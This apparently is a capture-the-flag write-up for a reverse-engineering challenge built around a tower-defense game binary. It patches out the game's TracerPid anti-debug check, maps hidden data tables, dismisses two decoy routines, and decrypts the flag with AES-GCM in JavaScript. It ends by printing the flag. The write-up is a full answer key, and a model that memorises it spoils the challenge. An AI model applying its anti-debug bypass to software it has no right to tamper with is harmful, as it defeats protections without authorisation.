+ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped
+BuildID: dafb397fd85953fabeb8d88594ce1034bdb82e82
+  .text      0x4fc0  to 0x26faa
+  .rodata    0x27000 to 0x288fe
+  .data      0x2d000 to 0x2d060
+  .bss       0x2d060 to 0x30aa8
+  init_array: 0xca10, 0x90d0, 0x9b90, 0xa690, 0xb2f0, 0xbf00
+```
+ 
+firstly grep the binary for the flag. there is no literal bbb, no bbb open brace, no flag, no ctf anywhere in the strings or the raw bytes. there are also no crypto library symbols at all, no aes, no gcm, no evp, no openssl. i took that second fact as proof that whatever encodes the flag has to be hand rolled inside the game which cost me an hour
+ 
+the runtime environment is just the local game, there is no docker or nsjail in the handout and the final solve never touches a remote, the only environment detail that mattered was the anti debug and only while i was doing dynamic analysis
+ 
+`sub_D2C0` at 0xd2c0 reads `/proc/self/status`, scans for the tracerpid line, parses the integer after it, and returns nonzero when it is nonzero. it is called at startup and again periodically. i patched a local copy so it always reports clean. the patch is three bytes at file offset 0xd2c0
+ 
+```text
+0xd2c0: 41 57 41   ->   31 c0 c3
+        push r15 ...      xor eax, eax
+                          ret
+```
+ 
+
+this way i could insert any tracer and have it be marked absent, classic patch 
+
+### object layout
+ 
+the two globals that hold everything are the tower table and the enemy table, i recovered the strides and field offsets statically and then confirmed them in the constructor, which is the clearest place to read them because it assigns names and calls the vector init helper field by field
+ 
+```text
+tower table  qword_2D380
+  8 entries, stride 0x90 (18 qwords)
+  entry + 0x00  name pointer  (Eagle, Owl, Parrot,)
+  entry + 0x60  1 vector  vector<uint16>
+  entry + 0x78  2 vector vector<uint16>
+ 
+enemy table  qword_2D080
+  8 entries, stride 0x60 (12 qwords)
+  entry + 0x00  name pointer  (Bug, Moth, Beetle,)
+  entry + 0x30  1 vector  vector<uint16>
+  entry + 0x48  2 vector vector<uint16>
+```
+ 
+the constructor confirms it, eagle is entry zero, and right after its name and stats it fills two vectors from rodata using a helper that allocates two bytes per element and memcpy from the source, which is a std vector of uint16 in everything but the type annotation, so eagle gets a first vector of length 7 at plus 0x60 and a second vector of length 5 at plus 0x78, next is the owl which is the very next entry at 0x2d410, which is 0x2d380 plus 0x90, so the stride is exactly what i measured. the enemy side is identical shape at 0x2d080 with stride 0x60, bug getting a first vector of length 7 and a second of length 2. the first vectors for a tower and the matching enemy of the same type index come from the same rodata source. eagle and bug both copy their first vector from the same address at length 7 so the first vectors are keyed by type, not by whether you are a bird or a bug
+ 
+### the mechanism/two red herrings
+ 
+there are two families of hidden vectors, the first vectors are read during gameplay by a controller only placement branch and the second vectors are never read during normal play and this split is meant to logically trap you!!
+ 
+the controller branch lives in the tower placement function `sub_1D4E0` at 0x1d4e0 so that when you place a tower on a path tile with a controller, it validates the tower type, the nearest enemy type, and the tile coordinate against the first vectors, you can find this check/condition around 0x1e1c8 to 0x1e34c
+ 
+```c
+if ( ((unsigned int)coord_num ^ tower_w1) != tower_type + 1 || enemy_type + 1 != ((unsigned int)coord_num ^ enemy_w1) )
+  //nothing
+```
+ 
+on success it does not print a flag but it prints a taunt built as the letters Hm followed by one extra m per path index so tile 0 says Hm, tile 3 says Hmmmm, and so on, and it goes through the transient message sink `sub_182C0` like any other floating game text. i spent a fuick ton of time chasing this branch because it is clearly the intended secret path, and it is genuinely satisfying to trigger but emits only mockery, also maybe its just instict from the ECSC 2025 to go down these. the coordinate encoding it validates is worth writing down because it unlocks the ordering rule where each path tile is an x y pair, and the branch turns it into a number by concatenating x with a two digit zero-padded y.
+ 
+```text
+coord_num(x, y) = int(str(x) + str(y).zfill(2))
+(0,10)  -> 10
+(3,7)   -> 307
+(19,17) -> 1917
+```
+ 
+there are 49 path tiles and for path index i the required type is i mod 8, and the first vector entry for that type at column i over 8 satisfies a very clean relation, used chatgpt for validation and all 49 tiles passed well.
+ 
+```python
+type_i = i % 8
+first_vector[type_i][i // 8] == coord_num(path[i]) ^ (type_i + 1)
+```
+ 
+red herring number two is `sub_1B5F0` at 0x1b5f0, which `sub_1D4E0` calls, because it writes and reads a file named `proc_tmp.txt`, computes a pile of djb2 hashes over decimal strings, runs a ten thousand iteration hashing loop, and produces a floating point accumulator with a sqrt and a sin times cos term
+ 
+```c
+acc = sqrt(fabs(digit + acc)) + sinx * cosx + acc
+```
+ 
+it looks like a key schedule, but.. its not. at the very end it just memcpy the selected tower first vector and returns that. the tail proves it copies from tower base plus 0x60, the first vector, never plus 0x78
+
+ 
+```text
+1cfc1 lea r12, qword_2D380
+1cfcc lea rax, [rbp+rbp*8]
+1cfd1 shl rax, 4
+1cfd5 add rax, r12
+1cfd8 mov rbx, [rax+68h]
+1cfdc sub rbx, [rax+60h]
+1d01b lea rax, [r12+rax+60h]
+1d027 mov rsi, [rax]
+1d02a mov rbx, [rax+8]
+1d03c call memcpy
+```
+ 
+with the help of Gemini I reconstructed the whole hash routine in python and matched its `proc_tmp.txt` output byte for byte for tile (0, 10), the first lines being 0, then 10, then hash_a=177621, then the ten thousand iteration stream. and matching all of it just told me that this function is a very elaborate way to hand me back data i already have, lmao
+ 
+### the primitive
+ 
+so the first vectors are decodable and prove an ordering rule, but they are not the flag, since they teach you to read the hidden tables in path order, cycling type through 0 to 7. hence the flag has to be the second vectors, because they are the only storage left, they are copied in at startup, and nothing ever reads them. the second vectors are 52 uint16 values total, 36 across the eight towers and 16 across the eight enemies
+ 
+```text
+0 Eagle    [22581, 9461, 53159, 20794, 5593]
+1 Owl      [35417, 32244, 48505, 40123, 9984]
+2 Parrot   [44453, 7279, 60514, 14916, 20153]
+3 Heron    [10610, 16355, 4331, 2948, 54]
+4 Falcon   [49663, 11851, 9043, 49724]
+5 Penguin  [32181, 65143, 32344, 15615]
+6 Flamingo [30239, 50969, 23891, 6576]
+7 Toucan   [19650, 443, 51968, 34369]
+ 
+0 Bug         [440, 18036]
+1 Moth        [34064, 18161]
+2 Beetle      [21306, 31871]
+3 Wasp        [23020, 3075]
+4 Caterpillar [43495, 32062]
+5 Locust      [39826, 26395]
+6 Spider      [27563, 35898]
+7 Mantis      [49039, 60046]
+```
+ 
+52 words is 104 bytes, which is a very reasonable size for a key plus an iv plus a tag plus a short ciphertext. here i should have re read challenge desc but instead i tried to derive a decoder from the binary, which does not even have one, oh well. 
+ 
+### the decode chain
+ 
+now the challenge desc says aes-gcm. so the second vectors are aes-gcm material, and the ordering rule the first vectors taught me is how you lay them out, so read the tables in path order, cycling type 0 to 7, and within each type append the tower vector then the enemy vector, then read down the columns, build it twice, once tower first and once enemy first
+ 
+```js
+function pathOrder(kind) {
+  const out = []
+  let j = 0
+  while (j < 7) {
+    let t = 0
+    while (t < 8) {
+      const seq = kind === 'enemyTower' ? enemy[t].concat(tower[t]) : tower[t].concat(enemy[t])
+      if (j < seq.length) {
+        out.push(seq[j])
+      }
+      t = t + 1
+    }
+    j = j + 1
+  }
+  return out
+}
+```
+ 
+encode each stream as big endian uint16, which gives two 104 byte buffers and then split them the obvious way, the key is the first 32 bytes of the enemy first stream, the iv is the first 16 bytes of the tower first stream, and the tag is the next 16 bytes of the tower first stream
+ 
+1. build both streams and encode big endian
+```js
+function wordsBE(words) {
+  const out = Buffer.alloc(words.length * 2)
+  words.forEach((w, i) => out.writeUInt16BE(w, i * 2))
+  return out
+}
+ 
+const towerPath = wordsBE(pathOrder('towerEnemy'))
+const enemyPath = wordsBE(pathOrder('enemyTower'))
+```
+ 
+2. split the material
+```js
+const key = enemyPath.subarray(0, 32)
+const iv = towerPath.subarray(0, 16)
+const tag = towerPath.subarray(16, 32)
+```
+ 
+3. take the ciphertext from the tower first stream. and this very very ugly because the ciphertext is bytes 32 to 70 plus a single trailing byte at index 71, skipping index 70, that skipped byte is a zero, the high half of the big endian word 0x0036, and the real final ciphertext byte is the low half 0x360  so the last plaintext bearing byte is smuggled as the low byte of the last word and the padding zero above it is dropped, lmao?
+```js
+const ciphertext = Buffer.concat([
+  towerPath.subarray(32, 70),
+  towerPath.subarray(71, 72)
+])
+```
+ 
+4. run aes-256-gcm and let the tag authenticate it, with no more data
+```js
+const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv)
+decipher.setAuthTag(tag)
+const flag = Buffer.concat([decipher.update(ciphertext), decipher.final()])
+console.log(flag.toString('utf8'))
+```
+  
+```text
+key = 01b88510533a59eca9e79b926babbf8f467446f17c7f0c037d3e671b8c3aea8e
+iv  = 58358a59ada52972c1ff7db5761f4cc2
+tag = 24f57df41c6f3fe32e4bfe77c71901bb
+ct  = cfa7bd79ec6210eb23537e585d53cb00513a9cbb3a440b84c23c3cff19b0864115d927004eb936
+```
+  
+```text
+bbb{pH3w_The_c0Ntro11er_I5_nOT_bR0k3n!}
+```
+  
